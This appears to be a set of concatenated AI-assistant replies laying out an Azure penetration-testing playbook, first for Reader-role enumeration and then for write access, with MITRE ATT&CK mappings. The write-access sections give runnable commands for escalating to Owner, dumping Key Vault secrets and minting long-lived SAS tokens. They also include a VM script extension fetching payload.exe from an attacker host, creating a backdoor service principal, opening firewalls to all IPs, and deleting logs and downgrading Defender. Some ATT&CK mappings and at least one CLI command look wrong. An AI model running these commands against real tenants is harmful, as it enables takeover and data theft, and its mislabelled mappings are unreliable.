Got it ✅ — let’s frame this as if you’re conducting a **professional Azure penetration test with only a read-only account (e.g., `Reader` role)**.

This means you don’t have write/modify rights, so your test cases focus on **information gathering, configuration review, and privilege escalation paths**. The key here is to **map the environment, look for misconfigurations, and identify attack paths** even though you can’t directly exploit them.

---

## 📋 Azure Pentest Approach with Reader Role

1. **Enumerate tenant information** (organization, subscriptions, domains, users, groups, service principals).
2. **Check IAM misconfigurations** (excessive privileges, legacy accounts, risky role assignments).
3. **Review storage & data exposure** (blobs, containers, keys).
4. **Network security posture review** (NSGs, firewalls, endpoints).
5. **Key Vault and secret exposure** (existence, access policies).
6. **Logging, monitoring, and Defender settings** (to check security maturity).
7. **Look for privilege escalation paths** (Reader may allow enumeration of identities/roles which can be chained).

---

## 📑 Test Cases for Azure Pentest (Reader Role)

| #  | Category               | Test Case                                       | Method / Azure CLI Example                                                     | What to Look For                                                                           |
| -- | ---------------------- | ----------------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------ |
| 1  | Tenant Info            | Enumerate tenant and domain info                | `az account tenant list`<br>`az ad signed-in-user show`                        | Identify org domains, tenant ID, branding, possible phishing angles                        |
| 2  | Subscription Discovery | List subscriptions available                    | `az account list --output table`                                               | Confirm accessible scope of testing                                                        |
| 3  | User & Groups          | Enumerate users and groups                      | `az ad user list --all`<br>`az ad group list`                                  | Identify stale users, guest accounts, and privileged groups (e.g., `Global Administrator`) |
| 4  | Service Principals     | Enumerate SPNs & apps                           | `az ad sp list --all`                                                          | Look for 3rd-party apps with high privileges, unused SPNs                                  |
| 5  | Role Assignments       | Review role assignments per subscription        | `az role assignment list --all --output table`                                 | Identify misassigned roles, privileged roles given to service principals or guest users    |
| 6  | IAM Priv Esc           | Check for “User Access Administrator” role      | `az role assignment list --role "User Access Administrator"`                   | If any account has this, they can escalate to Owner                                        |
| 7  | Storage Accounts       | Enumerate storage accounts & blob containers    | `az storage account list`<br>`az storage container list --account-name <acct>` | Publicly accessible storage, missing network restrictions                                  |
| 8  | Key Vaults             | List key vaults & access policies               | `az keyvault list`<br>`az keyvault show --name <vault>`                        | Identify secrets/certificates existence, weak access control                               |
| 9  | Networking             | Review Network Security Groups                  | `az network nsg list --output table`                                           | Overly permissive inbound (e.g., 0.0.0.0/0, RDP/SSH exposed)                               |
| 10 | Firewall Rules         | Enumerate SQL/Storage/VM firewalls              | `az sql server firewall-rule list --server <name>`                             | Open database access from all IPs                                                          |
| 11 | Virtual Machines       | List VM images & extensions                     | `az vm list -d -o table`<br>`az vm extension list --vm-name <name>`            | Weak extensions, old OS versions, vulnerable agents                                        |
| 12 | Defender Status        | Check security center / Defender coverage       | `az security pricing list`                                                     | Services not protected (VMs without Defender, SQL unprotected)                             |
| 13 | Activity Logs          | Enumerate logs enabled/disabled                 | `az monitor diagnostic-settings list --resource <id>`                          | Lack of logging → attackers could hide activities                                          |
| 14 | Conditional Access     | Review CA policies (if accessible)              | Graph API / Portal (Reader may see policies)                                   | Weak MFA enforcement, legacy auth enabled                                                  |
| 15 | Shadow Admins          | Look for non-Global Admins with high privileges | Compare role assignments to official MS docs                                   | “Privileged Role Administrator” or “App Admin” may allow escalation                        |

---

## 🔎 Key Pentest Insights

* **Reader role = reconnaissance goldmine.** Even though you can’t modify, you can map the attack surface for **privilege escalation or lateral movement**.
* **Cross-tenant risks.** Guest accounts (B2B) with privileges can be exploited.
* **Public exposure risks.** Blob storage, SQL servers, and NSGs often have misconfigurations.
* **Chained attack paths.** Example: If you find a Service Principal with `Contributor` on a subscription and its secret is stored in Key Vault → that’s an escalation path.

---

Perfect 🚀 Let’s build a **step-by-step pentest playbook** tailored for Azure cloud assessments using only a **Reader role**.
This will act like a **structured checklist** you can follow in sequence with `az cli` commands and interpretation guidance.

---

# 🔐 Azure Pentest Playbook (Reader Role)

---

## **Step 1 – Setup & Context Gathering**

🔹 Ensure you’re logged in with the Reader role:

```bash
az login
az account show
```

* Confirms tenant, subscription, and user identity.
* Note the `tenantId` and `subscriptionId` — they scope the test.

---

## **Step 2 – Tenant Recon**

```bash
az account tenant list
az ad signed-in-user show
az ad user list --all --output table
az ad group list --output table
```

📌 Look for:

* External guest users.
* Privileged groups (`Global Admin`, `Privileged Role Admin`).
* Shadow admins (roles that indirectly allow privilege escalation).

---

## **Step 3 – Subscription & Role Assignments**

```bash
az account list --output table
az role assignment list --all --output table
```

📌 Look for:

* Service Principals or users with `Owner`/`Contributor` roles.
* Over-permissioned guest accounts.
* Users with `User Access Administrator` → can escalate to Owner.

---

## **Step 4 – Service Principals & Applications**

```bash
az ad sp list --all --output table
az ad app list --all --output table
```

📌 Look for:

* SPNs with elevated roles.
* 3rd party apps with broad tenant permissions (e.g., `Directory.ReadWrite.All`).

---

## **Step 5 – Storage Enumeration**

```bash
az storage account list --output table
# For each account
az storage container list --account-name <storage-account>
```

📌 Look for:

* **Public blob access** (`isPublic: true`).
* Storage accounts without firewall/network restrictions.
* Sensitive naming patterns (e.g., “backup”, “logs”, “keys”).

---

## **Step 6 – Key Vaults**

```bash
az keyvault list --output table
# For each vault
az keyvault show --name <vault-name>
```

📌 Look for:

* Whether secrets/certs are stored.
* Weak access control (too many principals with access).
* Cross-subscription vault usage.

---

## **Step 7 – Networking & Firewalls**

```bash
az network nsg list --output table
az sql server list --output table
# For each SQL server
az sql server firewall-rule list --server <sql-server-name>
```

📌 Look for:

* **NSGs** allowing `0.0.0.0/0` inbound for SSH/RDP/SQL.
* SQL firewalls with `StartIP = 0.0.0.0` & `EndIP = 255.255.255.255`.
* Missing network restrictions on Storage or Key Vault.

---

## **Step 8 – Virtual Machines**

```bash
az vm list -d -o table
# For each VM
az vm extension list --vm-name <vm-name> --resource-group <rg>
```

📌 Look for:

* Old OS versions (Windows 2012, Ubuntu 14/16).
* Suspicious extensions (custom scripts, third-party agents).

---

## **Step 9 – Defender & Security Monitoring**

```bash
az security pricing list --output table
az monitor diagnostic-settings list --resource <resource-id>
```

📌 Look for:

* Resources without Defender coverage.
* Lack of diagnostic logs → attackers could hide activity.

---

## **Step 10 – Conditional Access & Legacy Auth**

(Reader can sometimes see via Graph API or portal)

```bash
az ad conditional-access policy list
```

📌 Look for:

* Lack of MFA enforcement.
* Legacy authentication protocols (POP, IMAP, SMTP) enabled.

---

## **Step 11 – Attack Path Mapping**

🔹 Using all collected data, check for chains like:

* SPN with Contributor role + Vault access = **privilege escalation**.
* Storage with logs/backups exposed = **data exfiltration**.
* Guest users in high-privilege groups = **external persistence**.

---

## **Step 12 – Reporting**

* Highlight **findings + impact**.
* Provide **recommendations** (e.g., enable Defender, restrict storage, enforce MFA).
* Map findings to **MITRE ATT\&CK for Cloud** (useful for professional pentest reports).

---

✅ This playbook ensures you **systematically enumerate and assess Azure** while restricted to the Reader role. You can run this as a checklist and gather evidence for reporting.
---

Great question 👍
If you also have **write access** (e.g., Contributor / Owner / custom roles with write perms), the scope of a pentest **widens significantly**.

Now you can move from **recon → misconfig review → active exploitation & persistence testing**.
This means you can actually **modify, deploy, or exploit** resources in a safe pentest scope.

---

# 🔐 Generic Azure Pentest Test Cases (With Write Access)

Here’s a **broad but practical set of test cases** grouped by category. I’ll include **what to test, how to test, and why it matters**.

---

## 1. **Identity & Access Management**

| # | Test Case                                      | Example Action                                            | Risk                                               |
| - | ---------------------------------------------- | --------------------------------------------------------- | -------------------------------------------------- |
| 1 | Enumerate roles and assignments                | `az role assignment list --all`                           | Identify over-permissioned accounts, shadow admins |
| 2 | Test privilege escalation via role assignments | Assign yourself elevated roles (if allowed)               | Misconfigured RBAC → Reader/Contributor → Owner    |
| 3 | Attempt User Access Administrator escalation   | `az role assignment create --role Owner --assignee <you>` | If possible → critical escalation path             |
| 4 | Abuse Managed Identity privileges              | `az ad sp list` → check roles                             | Managed Identity with broad roles can be abused    |

---

## 2. **Storage & Data Exposure**

| # | Test Case                          | Example Action                      | Risk                                        |
| - | ---------------------------------- | ----------------------------------- | ------------------------------------------- |
| 5 | Attempt blob upload/download       | `az storage blob upload/download`   | Sensitive data exposure                     |
| 6 | Check for container SAS tokens     | `az storage container generate-sas` | Leaking shared tokens → persistence / exfil |
| 7 | Try disabling network restrictions | Modify firewall rules               | Weak network segregation                    |

---

## 3. **Key Vaults**

| #  | Test Case                            | Example Action                                | Risk                            |
| -- | ------------------------------------ | --------------------------------------------- | ------------------------------- |
| 8  | List and attempt to retrieve secrets | `az keyvault secret list --vault-name <name>` | Access to secrets, creds, certs |
| 9  | Assign yourself access policy        | `az keyvault set-policy`                      | Escalation via vault secrets    |
| 10 | Abuse certificates for persistence   | Exportable certs used for AAD apps            | Long-term tenant access         |

---

## 4. **Compute (VMs, Functions, AKS)**

| #  | Test Case                       | Example Action                                | Risk                      |
| -- | ------------------------------- | --------------------------------------------- | ------------------------- |
| 11 | Deploy a VM extension           | `az vm extension set` (CustomScriptExtension) | Code execution on VM      |
| 12 | Check unmanaged disks/snapshots | `az disk list`                                | Exfiltration of VM disks  |
| 13 | Abuse Function Apps             | Deploy custom function                        | RCE + persistence         |
| 14 | AKS cluster misconfig           | `az aks list-credentials`                     | Full k8s cluster takeover |

---

## 5. **Networking**

| #  | Test Case                     | Example Action                    | Risk                               |
| -- | ----------------------------- | --------------------------------- | ---------------------------------- |
| 15 | Modify NSG rules              | `az network nsg rule create`      | Open RDP/SSH → external exposure   |
| 16 | Test App Gateway/WAF bypass   | Craft payloads to bypass rules    | Web app attacks                    |
| 17 | Disable firewall restrictions | Change SQL/Storage firewall rules | Lateral movement & external access |

---

## 6. **Monitoring & Logging**

| #  | Test Case                      | Example Action                          | Risk                         |
| -- | ------------------------------ | --------------------------------------- | ---------------------------- |
| 18 | Disable diagnostic logs        | `az monitor diagnostic-settings delete` | Covering tracks              |
| 19 | Disable Security Center alerts | `az security pricing update`            | Defense evasion              |
| 20 | Modify audit policies          | Turn off auditing on SQL servers        | Loss of detection capability |

---

## 7. **Persistence Techniques**

| #  | Test Case                           | Example Action                    | Risk                         |
| -- | ----------------------------------- | --------------------------------- | ---------------------------- |
| 21 | Create new Service Principal        | `az ad sp create-for-rbac`        | Hidden backdoor account      |
| 22 | Add yourself to privileged role     | `az role assignment create`       | Long-term persistence        |
| 23 | Deploy automation accounts/runbooks | `az automation runbook create`    | Covert persistence mechanism |
| 24 | Abuse Logic Apps                    | Create Logic App for exfiltration | Data theft automation        |

---

## 8. **Data Services**

| #  | Test Case                              | Example Action                       | Risk                           |
| -- | -------------------------------------- | ------------------------------------ | ------------------------------ |
| 25 | Connect to SQL DBs with Reader account | `sqlcmd -S <server>`                 | Sensitive data access          |
| 26 | Create/modify DB firewall rule         | `az sql server firewall-rule create` | Expose DB to external attacker |
| 27 | Abuse CosmosDB keys                    | `az cosmosdb keys list`              | Direct DB access without RBAC  |

---

## 9. **Attack Path Mapping**

* Correlate findings to **real-world attacks**:

  * VM takeover → Key vault dump → Priv escalation → Persistence.
  * Storage exposure → Password dump → Role assignment → Tenant takeover.

---

## 🔎 Key Difference from Reader Role

* With **Reader**: you can only **map** risks.
* With **Writer**: you can **exploit/test** risks → deploy VMs, modify NSGs, extract secrets, escalate privileges, and simulate persistence techniques.

---
Perfect ✅ — now we’ll expand the **Reader Playbook** into a **Write-Access Pentest Playbook**.
This will be **sequential, hands-on, and attack-focused** (still scoped for professional pentests).

Think of it as:

* **Phase 1**: Recon & misconfig review (safe)
* **Phase 2**: Active exploitation (write perms)
* **Phase 3**: Persistence testing
* **Phase 4**: Defense evasion

---

# 🔐 Azure Pentest Playbook (With Write Access)

---

## **Phase 1 – Recon & Baseline**

(Same as Reader playbook – gather environment info)

```bash
# Login & confirm scope
az login
az account show
az account list --output table
```

* Collect `tenantId`, `subscriptionId`, RBAC info.

```bash
# IAM discovery
az role assignment list --all --output table
az ad sp list --all --output table
az ad user list --all --output table
```

👉 Deliverable: Map **who has what role** and where misconfigs exist.

---

## **Phase 2 – Exploitation with Write Access**

### **2.1 Privilege Escalation**

```bash
# If you have User Access Administrator or Contributor
az role assignment create --assignee <your-object-id> --role "Owner" --scope /subscriptions/<sub-id>
```

📌 If successful → **critical escalation** → subscription takeover.

```bash
# Add yourself to Key Vault access policy
az keyvault set-policy --name <vault> --object-id <your-object-id> --secret-permissions get list
```

📌 Now retrieve secrets:

```bash
az keyvault secret list --vault-name <vault>
az keyvault secret show --name <secret> --vault-name <vault>
```

---

### **2.2 Storage Exploitation**

```bash
# Upload a blob (proof-of-write)
az storage blob upload --account-name <storage> -c <container> -f test.txt -n test.txt

# Generate SAS token for persistence
az storage account generate-sas --permissions acdlrw --services b --resource-types sco --expiry 2030-01-01 --account-name <storage>
```

📌 Risks: Data exfiltration, persistence via SAS tokens.

---

### **2.3 VM Exploitation**

```bash
# List VMs
az vm list -d -o table

# Deploy custom script extension (RCE)
az vm extension set --publisher Microsoft.Compute --name CustomScriptExtension \
  --vm-name <vm-name> --resource-group <rg> \
  --settings '{"commandToExecute":"powershell.exe -Command Invoke-WebRequest http://<attacker-ip>/payload.exe -OutFile C:\\payload.exe"}'
```

📌 Risks: Full **VM takeover**, lateral movement.

```bash
# Snapshot disks for offline exfil
az snapshot create --resource-group <rg> --source <disk-id> --name snapshot1
```

---

### **2.4 Networking Attacks**

```bash
# Open inbound RDP/SSH
az network nsg rule create --resource-group <rg> --nsg-name <nsg> \
  --name OpenRDP --priority 100 --direction Inbound --access Allow --protocol Tcp --destination-port-ranges 3389
```

📌 Risks: External attack surface expansion.

```bash
# Open SQL DB firewall
az sql server firewall-rule create --resource-group <rg> --server <sql-server> \
  --name OpenAll --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255
```

📌 Risks: Database exposure to internet.

---

### **2.5 Service Abuse**

```bash
# Get CosmosDB keys
az cosmosdb keys list --name <dbname> --resource-group <rg>
```

📌 Risks: Bypass RBAC → direct DB access.

```bash
# Deploy a malicious Logic App
az logic workflow create --resource-group <rg> --name evilApp --definition @evil.json
```

📌 Risks: Automated persistence, data exfil.

---

## **Phase 3 – Persistence Techniques**

### **3.1 Create Hidden Accounts**

```bash
# Create new Service Principal
az ad sp create-for-rbac --name "pentest-backdoor" --role Contributor
```

### **3.2 Abuse Automation**

```bash
# Create Runbook to auto-run malicious script
az automation runbook create --resource-group <rg> --automation-account-name <aa> \
  --name evilRunbook --type PowerShell --location eastus
```

### **3.3 SAS Token Persistence**

* Keep long-lived SAS tokens for blobs.
* Even if account RBAC is fixed, SAS tokens may stay valid.

---

## **Phase 4 – Defense Evasion**

### **4.1 Disable Security Controls**

```bash
# Disable diagnostic logging
az monitor diagnostic-settings delete --name diag1 --resource <resource-id>
```

### **4.2 Downgrade Defender**

```bash
# Remove Defender coverage
az security pricing update --name VirtualMachines --tier Free
```

📌 Risks: Attacker hides activity & weakens detection.

---

# 📝 Reporting Tips

* Highlight **attack chain examples**:

  1. Contributor → Key Vault → Secrets → Lateral Movement
  2. Contributor → VM Extension → RCE → Persistence
* Always document **what you changed** and **restore configs** after testing.
* Map to **MITRE ATT\&CK for Cloud** for credibility.

---

✅ This playbook now gives you **direct exploitation commands** for a pentest with write access.

---

👉 Do you want me to **condense this into a pentest “test case table”** (with columns: Test, Command, Risk, Recommendation) so you can use it as a **field-ready checklist** or even a **report template**?

Awesome 🚀 — here’s a **field-ready pentest checklist table** for **Azure with Write Access**.
It’s structured like a **test case sheet** you can run during engagements or adapt into your report template.

---

# 🔐 Azure Pentest Test Case Table (Write Access)

| #  | Test Case                                          | Command Example                                                                                                                                                                    | Risk if Successful                           | Recommendation                                            |
| -- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- | --------------------------------------------------------- |
| 1  | Escalate role to Owner                             | `az role assignment create --assignee <you> --role Owner --scope /subscriptions/<sub>`                                                                                             | Full subscription takeover                   | Apply least privilege, monitor RBAC changes               |
| 2  | Add yourself to Key Vault policy & extract secrets | `az keyvault set-policy --name <vault> --object-id <you> --secret-permissions get list`<br>`az keyvault secret list --vault-name <vault>`                                          | Credentials / certs theft, lateral movement  | Restrict KV policies, enable logging & alerts             |
| 3  | Upload blob to storage container                   | `az storage blob upload --account-name <acct> -c <container> -f test.txt -n test.txt`                                                                                              | Data tampering / malware hosting             | Enforce private access, use firewall/VNet                 |
| 4  | Generate long-lived SAS token                      | `az storage account generate-sas --permissions acdlrw --services b --resource-types sco --expiry 2030-01-01 --account-name <acct>`                                                 | Persistent access even after RBAC fixes      | Rotate SAS, disable shared key auth                       |
| 5  | Deploy VM extension (Custom Script)                | `az vm extension set --publisher Microsoft.Compute --name CustomScriptExtension --vm-name <vm> --resource-group <rg> --settings '{"commandToExecute":"..."}'`                      | Remote Code Execution on VM                  | Restrict extension use, monitor unusual changes           |
| 6  | Snapshot VM disks                                  | `az snapshot create --resource-group <rg> --source <disk-id> --name snap1`                                                                                                         | Offline credential extraction / full VM copy | Restrict Contributor access, monitor disk ops             |
| 7  | Open RDP port via NSG                              | `az network nsg rule create --resource-group <rg> --nsg-name <nsg> --name OpenRDP --priority 100 --direction Inbound --access Allow --protocol Tcp --destination-port-ranges 3389` | Exposes VM to external attack                | Apply least privilege NSG rules, alert on changes         |
| 8  | Open SQL DB firewall globally                      | `az sql server firewall-rule create --resource-group <rg> --server <sql> --name OpenAll --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255`                               | Database exposed to internet                 | Restrict IP ranges, enforce private endpoints             |
| 9  | Retrieve CosmosDB keys                             | `az cosmosdb keys list --name <db> --resource-group <rg>`                                                                                                                          | Direct DB access bypassing RBAC              | Use RBAC auth, rotate keys, monitor key access            |
| 10 | Create new Service Principal (backdoor)            | `az ad sp create-for-rbac --name "backdoor" --role Contributor`                                                                                                                    | Hidden persistence                           | Review & audit SPNs regularly                             |
| 11 | Deploy malicious Logic App / Runbook               | `az logic workflow create ...`<br>`az automation runbook create ...`                                                                                                               | Persistence, automated data theft            | Limit automation rights, monitor for suspicious workflows |
| 12 | Disable diagnostic logging                         | `az monitor diagnostic-settings delete --name diag1 --resource <id>`                                                                                                               | Activity becomes invisible                   | Lock down logging, enforce policies via Azure Policy      |
| 13 | Downgrade Defender plan                            | `az security pricing update --name VirtualMachines --tier Free`                                                                                                                    | Reduced detection & protection               | Enforce Defender, restrict security settings changes      |

---

✅ With this table, you now have:

* **Command** to run,
* **Expected risk** (impact),
* **Recommendation** to fix.

This can double as your **test execution checklist** *and* as your **reporting framework**.

---

Perfect ✅ — mapping your Azure pentest test cases to **MITRE ATT\&CK (Cloud/Enterprise)** makes your report **professional-grade** and shows how each finding fits into known adversary tactics.

Here’s the updated **Azure Pentest Test Case Table with MITRE ATT\&CK mappings**:

---

# 🔐 Azure Pentest Test Cases (Write Access + MITRE ATT\&CK)

| #  | Test Case                                          | Command Example                                                                        | Risk if Successful                           | MITRE ATT\&CK Mapping                                                                                                                                                     | Recommendation                                       |
| -- | -------------------------------------------------- | -------------------------------------------------------------------------------------- | -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| 1  | Escalate role to Owner                             | `az role assignment create --assignee <you> --role Owner --scope /subscriptions/<sub>` | Full subscription takeover                   | **Privilege Escalation (T1068)**, **Valid Accounts (T1078.004 – Cloud Accounts)**                                                                                         | Apply least privilege, monitor RBAC changes          |
| 2  | Add yourself to Key Vault policy & extract secrets | `az keyvault set-policy ...`<br>`az keyvault secret list --vault-name <vault>`         | Credential theft, lateral movement           | **Credential Access (T1552.001 – Credentials in Files)**                                                                                                                  | Restrict KV policies, enable logging & alerts        |
| 3  | Upload blob to storage container                   | `az storage blob upload ...`                                                           | Data tampering / malware hosting             | **Impact (T1565.001 – Stored Data Manipulation)**                                                                                                                         | Enforce private access, use firewall/VNet            |
| 4  | Generate long-lived SAS token                      | `az storage account generate-sas ...`                                                  | Persistent access even after RBAC fixes      | **Persistence (T1098.001 – Additional Cloud Credentials)**                                                                                                                | Rotate SAS, disable shared key auth                  |
| 5  | Deploy VM extension (Custom Script)                | `az vm extension set ...`                                                              | Remote Code Execution on VM                  | **Execution (T1059 – Command and Scripting Interpreter)**, **Persistence (T1546.008 – Boot or Logon Autostart Execution: XDG Autostart Entries / Cloud Startup Scripts)** | Restrict extension use, monitor unusual changes      |
| 6  | Snapshot VM disks                                  | `az snapshot create ...`                                                               | Offline credential extraction / full VM copy | **Collection (T1005 – Data from Local System)**, **Exfiltration (T1020 – Automated Exfiltration)**                                                                        | Restrict Contributor access, monitor disk ops        |
| 7  | Open RDP port via NSG                              | `az network nsg rule create ...`                                                       | Exposes VM to external attack                | **Defense Evasion (T1562.004 – Disable or Modify Cloud Firewall)**                                                                                                        | Apply least privilege NSG rules, alert on changes    |
| 8  | Open SQL DB firewall globally                      | `az sql server firewall-rule create ...`                                               | Database exposed to internet                 | **Exfiltration (T1048 – Exfiltration Over Alternative Protocol)**                                                                                                         | Restrict IP ranges, enforce private endpoints        |
| 9  | Retrieve CosmosDB keys                             | `az cosmosdb keys list ...`                                                            | Direct DB access bypassing RBAC              | **Credential Access (T1552.007 – Cloud Service Account Keys)**                                                                                                            | Use RBAC auth, rotate keys, monitor key access       |
| 10 | Create new Service Principal (backdoor)            | `az ad sp create-for-rbac ...`                                                         | Hidden persistence                           | **Persistence (T1136.003 – Create Cloud Account)**                                                                                                                        | Review & audit SPNs regularly                        |
| 11 | Deploy malicious Logic App / Runbook               | `az logic workflow create ...`<br>`az automation runbook create ...`                   | Persistence, automated data theft            | **Execution (T1059)**, **Persistence (T1546.008)**, **Exfiltration (T1020)**                                                                                              | Limit automation rights, monitor workflows           |
| 12 | Disable diagnostic logging                         | `az monitor diagnostic-settings delete ...`                                            | Activity becomes invisible                   | **Defense Evasion (T1562.008 – Disable Cloud Logging)**                                                                                                                   | Lock down logging, enforce Azure Policy              |
| 13 | Downgrade Defender plan                            | `az security pricing update ...`                                                       | Reduced detection & protection               | **Defense Evasion (T1562.001 – Disable or Modify Security Tools)**                                                                                                        | Enforce Defender, restrict security settings changes |

---

✅ Now you can:

* Use this as a **field checklist** (execute commands → observe results).
* Drop it directly into a **professional report** (risk + MITRE mapping + fix).
* Show management how issues align to **real attacker behaviors**.

---



---
